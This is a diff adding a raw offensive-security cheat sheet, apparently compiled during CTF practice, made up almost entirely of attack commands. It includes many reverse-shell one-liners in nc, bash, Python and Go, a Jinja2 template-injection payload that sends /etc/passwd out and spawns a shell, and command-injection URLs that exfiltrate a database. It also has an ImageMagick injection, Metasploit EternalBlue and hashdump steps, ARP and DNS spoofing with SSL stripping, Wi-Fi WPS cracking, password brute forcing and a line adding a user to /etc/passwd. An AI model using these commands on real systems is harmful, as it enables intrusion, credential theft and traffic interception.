@@ -1,0 +1,522 @@
+37743602
+nmap  --script=vuln enable vulnerable scripts detection 
+TCP(-sT)/SYN(-sS)/UDP(-sU)/TCP Null(-sN)/TCP FIN (-sF)/CP Xmas (-sX)
+nmap -sn 192.168.0.0/24 (ping scan) 
+-f > fragment packets to skip firewall
+--scan-delay > time between packets in ms
+--badsum > can be used to determine firewall presence
+nmap -sS -p- machine
+##########################################################################################
+####-- Mysql :
+####################################################################
+#https://ctf.hacker101.com/ctf/flagcheck
+root root_pwd 
+phpmyadmin phpmyadmin
+rachid achid_pass
+
+##########################################################################################
+####-- Mysql :
+####################################################################
+#
+`````````````````````````````````
+
+python2.7 -m SimpleHTTPServer 80
+python3.8 -m http.server 80
+##########################################################################################
+####-- Mysql :
+####################################################################
+xhost +
+java -noverify -jaWvaaWgeWnt:Dr.FWaWrWFaWr.jar -jar burpsuite_pWro_v2020.12.1.jar
+
+##########################################################################################
+####-- xhost:
+####################################################################
+xhost+
+
+command ijection payloads
+;cat${IFS%??}/usr/local/apache/passwd/passwords;  Space added via variable
+;cp${IFS%??}admin${IFS%??}toto ;
+;ls${IFS%??}-la${IFS%??}>tit.txt;
+#Common Hack tools
+##########################################################################################
+####-- netcut via injection
+####################################################################
+#
+{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc.traditional -e /bin/bash 10.10.14.193 5555')['read']() == 'chiv' %} a {% endif %}
+nc.traditional -e /bin/bash 10.9.3.44 4444 #connection perform
+nc 10.9.3.44 4444  –e /bin/bash
+bash -i >& /dev/tcp/10.9.3.44/4444 0>&1
+http://ultratech.kal:8081/ping?ip=10.10.41.76
+*:`nc 10.9.3.44 4444  –e /bin/bash`
+nc -l -v -p 4444  listener # Listen to net cut
+nc -nlvp 4444
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+rm -f /tmp/fz; mkfifo /tmp/fz;cat /tmp/fz | /bin/sh -i 2>&1 | nc -l 10.9.0.104 4444 > /tmp/fz
+nc -c /bin/bash 10.9.3.44 4444 
+/bin/bash -i >& /dev/tcp/10.9.3.44/5555 0>&1
+/bin/sh | nc <your IP> <any unfiltered port>
+ nc -l -p <any unfiltered port> -vvv
+nc -e /bin/sh 10.9.3.44 4444 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.9.3.44:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.3.44",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+https://www.commandlinefu.com/commands/view/11061/emulating-netcat-e-netcat-traditional-or-netcat-openbsd-with-the-gnu-netcat
+mkfifo /tmp/foo ; nc 10.9.3.44 4444  0</tmp/foo | /bin/bash 1>/tmp/foo
+http://ultratech.kal:8081/ping?ip=127.0.0.1 `nc -w 3 10.9.3.44 5555 < utech.db.sqlite`
+http://ultratech.kal:8081/ping?ip=127.0.0.1 `mkfifo /tmp/foo ; nc 10.9.3.44 5555  0</tmp/foo | /bin/bash 1>/tmp/foo`
+SEND THE RECIEVE
+nc -l -p 5555 > utech.db.sqlite
+nc -w 3 10.9.3.44 5555 < utech.db.sqlite
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+##########################################################################################
+####-- nikto examples
+####################################################################
+#
+nikto -h f10.10.10.209 -C all -output hackbox-209.html F txt
+
+##########################################################################################
+####-- Wordlists
+####################################################################
+#
+https://github.com/danielmiessler/SecLists
+https://github.com/fuzzdb-project/fuzzdb.git
+##########################################################################################
+####-- php inject remote shell to meta sploit
+####################################################################
+#
+php -f reverse_tcp.php 
+##########################################################################################
+####-- PGP TOOL 
+####################################################################
+#
+https://docs.rackspace.com/blog/introduction-to-pgp-encryption-and-decryption/
+gpg --import key.asc
+gpg --output doc --decrypt credential.pgp        
+##########################################################################################
+####-- PGP TOOL /Hohn the ripper
+####################################################################
+#/usr/share/john/ssh2john.py
+john --show key.gpg.hash  
+gpg2john tryhackme.asc > key.gpg.hash 
+ssh2john tryhackme.asc > key.gpg.hash 
+john --wordlist=/usr/share/wordlists/rockyou.txt key.gpg.hash 
+unique -v -inp=allwords.txt uniques.txt -> uniques entries
+unshadow passwd shadow > unshadowed.txt --> unshadow file
+##########################################################################################
+####-- WPscan 
+####################################################################
+wpscan –url http://mr-robot.ctf/wp-login.php –passwords fsocity.dic –usernames Elliot
+whatweb -v -a 3 jce.ctf 
+
+loop
+while true; do cp /tmp/draft.yml file.yml; done
+#
+####-- All reverse tcp urls
+https://hacksland.net/reverse-tcp-shell-with-metasploit
+msfvenom -p linux/x64/meterpreter/reverse_tcp -o shell.elf LHOST=10.10.14.127 LPORT=4444 > reverse.sh
+####--  run nmap with saving in database
+db_nmap -A 192.168.0.172
+nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV -p 192.168.0.1
+####-- view all hosts scanned
+hosts 
+####-- view detected vulnerabiliries
+vulns 
+####-- list nmap detected vulns 
+services 
+####-- cause DOS in HTTP remote host
+auxiliary/dos/http/ms15_034_ulonglongadd  
+####-- how to create meta sploit payloads.
+https://netsec.ws/?p=331 
+####--  may be install win to be able to mak exec files in lunix 
+wine python.exe
+use hexeditpr to update some txt 
+####-- run exploit listner in background
+exploit -j -z  
+####-- hows runing background
+jobs  
+####-- Exploits handler and windows privelege escalation
+exploit/multi/handler
+windows/local/bypassuac_silentcleanup
+crash db location
+/usr/bin/whoopsie -f
+
+
+download all links in a website
+
+wget -r -np -l 1 -A zip http://example.com/download/
+
+##########################################################################################
+####-- Privelege escalation
+####################################################################
+#
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+https://ayedaemon.medium.com/linux-privilege-escalation-8fd05ae5e7fe
+https://www.aldeid.com/wiki/Category:Penetration-testing/Privilege-escalation/Linux
+####-- setuid processuses root
+ find / -perm -u=s 2>/dev/null | xargs ls -l 
+####-- View console when reverse tcp 
+history
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+Shell Spawning
+
+    python -c 'import pty; pty.spawn("/bin/sh")'
+
+    echo os.system('/bin/bash')
+
+    /bin/sh -i
+
+    perl —e 'exec "/bin/sh";'
+
+    perl: exec "/bin/sh";
+
+    ruby: exec "/bin/sh"
+
+    lua: os.execute('/bin/sh')
+
+    (From within IRB)
+
+    exec "/bin/sh"
+
+    (From within vi)
+
+    :!bash
+
+    (From within vi)
+
+    :set shell=/bin/bash:shell
+
+    (From within nmap)
+    !sh
+wget 10.9.3.44/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+####-- Add user to ETC
+echo "tic:x:201:65534::/run/rpcbind:/usr/sbin/nologin" >> /etc/passwd
+####-- Print sudo corn jobs
+cat /etc/crontab  >> corn jobs 
+####-- view environement variables
+printenv to view en vars
+##########################################################################################
+####-- HASH IDENTIFYING
+####################################################################
+####-- 
+
+hash-identifier
+
+##########################################################################################
+####-- pown cat
+####################################################################
+
+# Copy base64 data to clipboard from where you have internet access
+curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
+
+# Paste it on the target machine
+echo "<BASE64 STRING>" | base64 -d > pwncat
+chmod +x pwncat
+# exec this in the victim
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
+pwncat -e '/bin/bash' 192.168.8.106 4444 --reconn --recon-wait 1
+##########################################################################################
+####-- sendmail
+####################################################################
+sudo apt-get sendmail
+sendmailconfig
+##########################################################################################
+####-- hydra
+####################################################################
+####-- /usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-500.txt
+hydra -L Usernames/Names/names.txt -p pass  jce.ctf http-post-form "/users/login.php:username=^USER^&password=user:The username/password combination you have entered is invalid" -V
+#ssh
+hydra -l meliodas -P rockyou_txt on.ctf ssh     -t 6
+medusa -h hd.ctf -u meliodas  -P 0-million-password-list-top-100.txt -M ssh
+#basic auth
+hydra -l jan -P /tmp/rock7.txt  pn.ctf  -f -s 8080 http-get /manager/html
+##########################################################################################
+####-- MONITORING
+####################################################################
+####-- VIEW OPNED CONNEXIONS
+
+netstat -natp  
+
+--
+lftp -u user,pass host.com
+lftp  host.com --> for anonymous
+###################### ####################################################################
+####-- TIPS
+####################################################################
+####-- Search for all passwords existing in files
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+
+##########################################################################################
+####-- USEFUL SMB COMMANDS
+####################################################################
+ 
+
+https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+https://tldp.org/HOWTO/SMB-HOWTO-8.html
+smbmap -H  anonymous.ctf > view smb shares 
+//mount
+mount -t cifs //anonymous.ctf/pics /mnt/share
+mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
+
+smbclient //host/share -U " "%" "
+smbclient //anonymous.ctf/IPC$ -U guest%
+#1/view 
+smbclient -L pn.ctf
+#2/connect to a folder
+smbclient //pn.ctf/Anonymous 
+#3/ get file.txt /tmp/f.txt
+enum4linux pn.ctf 
+##########################################################################################
+####-- Prute password generator
+####################################################################
+python pywgen.py -char az09 -len 3
+
+
+##########################################################################################
+####-- prevlège escalation
+####################################################################
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
+
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash; 
+# inject shell in python file 
+echo 'import pty;pty.spawn("/bin/bash")' > /home/meliodas/bak.py
+
+##########################################################################################
+####-- Sniper reports
+####################################################################
+/usr/share/sniper/loot/workspace/
+
+####-- Update date in 
+sudo timedatectl set-timezone Europe/Madrid
+timedatectl
+sudo ntpdate -s time.nist.gov
+timedatectl
+##########################################################################################
+####-- URLS
+####################################################################
+
+group files by size
+head /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt |  cat  | sort | uniq | pw-inspector -m 8 -M 8
+grep -v "\." words.txt > s.txt  words without . on them 
+
+cat raft-*.txt |  cat  | sort | uniq | pw-inspector -m 8 -M 8 | grep -v "\." > tmp/rest9/words.txt
+cat password.txt  |  grep -P '(?<!\d)\d(?!\d)' | sort > go.txt
+
+
+ajp tomcat 
+python3 ajpShooter.py http://pn.ctf 8009 /WEB-INF/web.xml read
+
+
+resources
+
+
+####-- Type of templates to perform injections
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+
+
+####--Explainaing shells
+https://explainshell.com/explain
+
+####--Dns recon tool for subdomais
+https://hackersonlineclub.com/dnsrecon-to-use-dns-information-gathering/
+/usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://hk.ctf -w /usr/share/dirb/wordlists/common.txt -x php,html,txt
+gobuster dir -u http://hk.ctf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://lazy-admin.ctf/ -H "Host: FUZZ.lazy-admin.ctf" --hw 290 
+-s "204,301,302,307,401,403"  >> Add this to gobuster if server is configured to always return 200
+(where 290 is the width) can be used to remove some results
+python3 403fuzzer.py -u http://pss.ctf:8001/403.php -p http://localhost:8080 -hc 404,403 
+dotdotpwn.pl -m http -h 192.168.1.1 -x 80 -M GET  # path transversal / traversal
+####-- Sec lists  all lists 
+https://github.com/danielmiessler/SecLists
+
+####-- find line iside file with line number 
+grep -n 'ER28-0652'  /home/kali/tools/tryhackme/fsocity.dic 
+####--
+
+####-- pypass 403 forbidden 
+curl -H "Content-Length:0" -X POST 
+
+
+
+
+Log in with a private key
+ssh -i deployment_key.txt demo@192.237.248.66
+
+##########################################################################################
+####-- Bettercap
+####################################################################
+sudo bettercap -caplet http-ui
+
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.0.128
+arp.spoof on
+
+
+
+set dns.spoof.all true
+set dns.spoof.address 192.168.0.166
+set dns.spoof.domains totomeme.com
+dns.spoof on
+
+
+
+set http.server.address 192.168.0.166
+set http.server.port 80
+set http.server.path /var/www/html
+http.server on
+
+
+set http.proxy.sslstrip true
+http.proxy on
+
+
+
+set net.sniff.output /home/kali/tools/bettercap/192.168.0.107.cap
+net.sniff on
+
+xss crit injector7
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+
+ 
+##########################################################################################
+####-- NETWORKING
+####################################################################
+tx-power
+sudo ifconfig wlan1 down
+sudo ifconfig wlan0 down
+sudo iw reg set US    
+sudo ifconfig wlan0 up  
+sudo ifconfig wlan1 up
+                        
+
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo wash -i wlan0   
+
+sudo reaver -i wlan0 -b 9C:97:26:60:96:05 -c 1 -e TNCAP609605   -K 1 -vv
+
+genpmk -f <file location> -d PMK-<routername> -s "<routername>"
+https://projectintrusion.wordpress.com/2018/03/30/cracking-wpa-wpa2-2/
+
+
+
+
+
+##########################################################################################
+####-- Metasploit
+####################################################################
+
+exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/shell/reverse_tcp
+post/multi/manage/shell_to_meterpreter
+
+load kiwi
+hashdump to get hashes 
+
+c:\Windows\System32\config
+dir flag3.txt /s /p    
+
+
+
+##########################################################################################
+####-- HASHs 
+####################################################################
+
+# Unshadow password file
+/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
+john /tmp/crack.password.db
+$ john -show /tmp/crack.password.db 
+
+
+# Define hash type and its equivalent hashcat id
+hashid -m -j '$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom'  >> find type of hash 
+# use hashcat to crack
+hashcat  -m 3200 '$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom'  /usr/share/wordlists/rockyou.txt
+# website for hashing
+https://crackstation.net/
+https://www.tunnelsup.com/hash-analyzer/
+# unix sha-512
+hashcat  -m 1800 '$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.' $rockyou_txt -O 
+
+python3 ./wordlistctl.py list -g usernames # search for wordlist
+python3 ./wordlistctl.py fetch -l CommonAdminBase64   # install a wordlist
+
+mentalist /usr/share/passes.tx # tool will help in editing wordlists
+
+# get wordlist from a website 
+cewl -d 2 -w off.txt http://pf.com
+##########################################################################################
+####-- Images tips  
+####################################################################
+https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-1-0162818/
+##########################################################################################
+####-- File types 
+####################################################################
+https://filesamples.com/categories/document
+
+
+
+##########################################################################################
+####-- Image magic
+####################################################################
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://pre09.example.net/15bd/th/pre/f/2012/237/c/7/all_work_and_no_something/someting_by_nebezial-d5cdlor.jpg";curl "10.9.4.72)'
+pop graphic-context
+
+---
+
+
+
+##########################################################################################
+####-- tunuel and port forwarding 
+####################################################################
+######WAY 1
+#on local
+chisel server --reverse --port 9002
+#on victim
+./chisel client 10.9.4.72:9002 R:9001:127.0.0.1:8080
+#on local
+configure proxy to localhost 6666
+######WAY 2
+#tunel vpn con creation 
+#on local
+sudo service ssh start
+configure proxy with localhost :6666
+
+#on target
+ssh -R 6666:localhost:6666 kali@10.9.4.72
+
+
+##########################################################################################
+####-- GET POWERFUL Shell
+####################################################################
+
+#### IN target 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.4.72",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+####> in host
+nc -lvn 7777
+####CTRl+Z
+stty raw -echo;fg   
+
+
+sudo openvpn --auth-nocache --config eden.martino.ovpn
+
+
+
+https://gchq.github.io/CyberChef/
+https://www.exifdata.com/
+https://www.secsy.net/easy_stegoCTF
+
+
+
+
+python3 -m venv pwncat-env
+source pwncat-env/bin/activate
+pwncat --listen -p 5555
